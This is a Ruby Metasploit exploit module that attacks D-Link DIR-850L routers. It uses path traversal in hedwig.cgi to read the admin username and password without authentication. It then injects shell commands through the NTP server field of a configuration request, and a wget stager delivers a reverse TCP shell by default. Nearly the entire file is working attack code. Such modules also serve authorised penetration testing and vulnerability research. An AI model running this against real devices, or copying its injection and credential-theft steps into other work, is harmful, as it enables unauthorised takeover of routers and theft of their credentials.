# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;openssl&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;DIR-850L (Un)authenticated OS Command Exec&#039;,
      &#039;Description&#039; => %q{
        This module leverages an unauthenticated credential disclosure
        vulnerability to then execute arbitrary commands on DIR-850L routers
      },
      &#039;Author&#039; => [
        &#039;Mumbai&#039;, # https://github.com/realoriginal (module)
        &#039;Zdenda&#039; # vuln discovery
      ],
      &#039;References&#039; => [
        [&#039;URL&#039;, &#039;https://www.seebug.org/vuldb/ssvid-96333&#039;],
        [&#039;URL&#039;, &#039;https://blogs.securiteam.com/index.php/archives/3310&#039;],
      ],
      &#039;DisclosureDate&#039; => &#039;Aug 9 2017&#039;,
      &#039;License&#039; => MSF_LICENSE,
      &#039;Platform&#039; => &#039;linux&#039;,
      &#039;Arch&#039; => ARCH_MIPSBE,
      &#039;DefaultTarget&#039; => 0,
      &#039;DefaultOptions&#039; => {
        &#039;PAYLOAD&#039; => &#039;linux/mipsbe/shell/reverse_tcp&#039;
      },
      &#039;Privileged&#039; => true,
      &#039;Payload&#039; => {
        &#039;DisableNops&#039; => true,
      },
      &#039;Targets&#039; => [[ &#039;Automatic&#039;, {} ]],
    ))
  end

  def check
    begin
      res = send_request_cgi({
        &#039;uri&#039; => &#039;/&#039;,
        &#039;method&#039; => &#039;GET&#039;
        })
      if res && res.headers[&#039;Server&#039;]
        auth = res.headers[&#039;Server&#039;]
        if auth =~ /DIR-850L/
          if auth =~ /WEBACCESS\/1\.0/
            return Exploit::CheckCode::Safe
          else
            return Exploit::CheckCode::Detected
          end
        end
      end
    rescue ::Rex::ConnectionError
      return Exploit::CheckCode::Unknown
    end
    Exploit::CheckCode::Unknown
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: &#039;tcp&#039;,
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end


  # some other DIR-8X series routers are vulnerable to this same retrieve creds vuln as well...
  # should write an auxiliary module to-do -> WRITE AUXILIARY
  def retrieve_creds
    begin
      xml = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n"
      xml << "<postxml>\r\n"
      xml << "<module>\r\n"
      xml << "  <service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service>\r\n"
      xml << "</module>\r\n"
      xml << "</postxml>"
      res = send_request_cgi({
        &#039;uri&#039; => &#039;/hedwig.cgi&#039;,
        &#039;method&#039; => &#039;POST&#039;,
        &#039;encode_params&#039; => false,
        &#039;headers&#039; => {
          &#039;Accept-Encoding&#039; => &#039;gzip, deflate&#039;,
          &#039;Accept&#039; => &#039;*/*&#039;
        },
        &#039;ctype&#039; => &#039;text/xml&#039;,
        &#039;cookie&#039; => "uid=#{Rex::Text.rand_text_alpha_lower(8)}",
        &#039;data&#039; => xml,
      })
      if res.body =~ /<password>(.*)<\/password>/ # fixes stack trace issue
        parse = res.get_xml_document
        username = parse.at(&#039;//name&#039;).text
        password = parse.at(&#039;//password&#039;).text
        vprint_good("#{peer} - Retrieved the username/password combo #{username}/#{password}")
        loot = store_loot("dlink.dir850l.login", "text/plain", rhost, res.body)
        print_good("#{peer} - Downloaded credentials to #{loot}")
        return username, password
      else
        fail_with(Failure::NotFound, "#{peer} - Credentials could not be obtained")
      end
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unknown, "#{peer} - Unable to connect to target.")
    end
  end

  def retrieve_uid
    begin
      res = send_request_cgi({
          &#039;uri&#039; => &#039;/authentication.cgi&#039;,
          &#039;method&#039; => &#039;GET&#039;,
      })
      parse = res.get_json_document
      uid = parse[&#039;uid&#039;]
      challenge = parse[&#039;challenge&#039;]
      return uid, challenge
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unknown, "#{peer} - Unable to connect to target.")
    end
  end

  def login(username, password)
    uid, challenge = retrieve_uid
    begin
      hash = OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new(&#039;md5&#039;), password.to_s, (username.to_s + challenge.to_s)).upcase
      send_request_cgi({
        &#039;uri&#039; => &#039;/authentication.cgi&#039;,
        &#039;method&#039; => &#039;POST&#039;,
        &#039;data&#039; => "id=#{username}&password=#{hash}",
        &#039;cookie&#039; => "uid=#{uid}"
      })
      return uid
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unknown, "#{peer} - Unable to connect to target.")
    end
  end

  def execute_command(cmd, opts)
    uid = login(@username, @password) # reason being for loop is cause UID expires for some reason after executing 1 command
    payload = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n"
    payload << "<postxml>\r\n"
    payload << "<module>\r\n"
    payload << "  <service>DEVICE.TIME</service>\r\n"
    payload << "  <device>\r\n"
    payload << "    <time>\r\n"
    payload << "      <ntp>\r\n"
    payload << "        <enable>1</enable>\r\n"
    payload << "        <period>604800</period>\r\n"
    payload << "        <server>#{Rex::Text.rand_text_alpha_lower(8)}; (#{cmd}&); </server>\r\n"
    payload << "      </ntp>\r\n"
    payload << "      <ntp6>\r\n"
    payload << "        <enable>1</enable>\r\n"
    payload << "        <period>604800</period>\r\n"
    payload << "      </ntp6>\r\n"
    payload << "      <timezone>20</timezone>\r\n"
    payload << "      <time/>\r\n"
    payload << "      <date/>\r\n"
    payload << "      <dst>0</dst>\r\n"
    payload << "      <dstmanual/>\r\n"
    payload << "      <dstoffset/>\r\n"
    payload << "    </time>\r\n"
    payload << "  </device>\r\n"
    payload << "</module>\r\n"
    payload << "</postxml>"
    begin
      # save configuration
      res = send_request_cgi({
        &#039;uri&#039; => &#039;/hedwig.cgi&#039;,
        &#039;method&#039; => &#039;POST&#039;,
        &#039;ctype&#039; => &#039;text/xml&#039;,
        &#039;data&#039; => payload,
        &#039;cookie&#039; => "uid=#{uid}"
      })
      # execute configuration
      res = send_request_cgi({
        &#039;uri&#039; => &#039;/pigwidgeon.cgi&#039;,
        &#039;method&#039; => &#039;POST&#039;,
        &#039;data&#039; => &#039;ACTIONS=SETCFG,ACTIVATE&#039;,
        &#039;cookie&#039; => "uid=#{uid}"
      })
      return res
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unknown, "#{peer} - Unable to connect to target.")
    end
  end


  def exploit
    print_status("#{peer} - Connecting to target...")

    unless check == Exploit::CheckCode::Detected
      fail_with(Failure::Unknown, "#{peer} - Failed to access vulnerable url")
    end
    #
    # Information Retrieval, obtains creds and logs in
    #
    @username, @password = retrieve_creds
    execute_cmdstager(
      :flavor => :wget,
      :linemax => 200
    )
  end
end

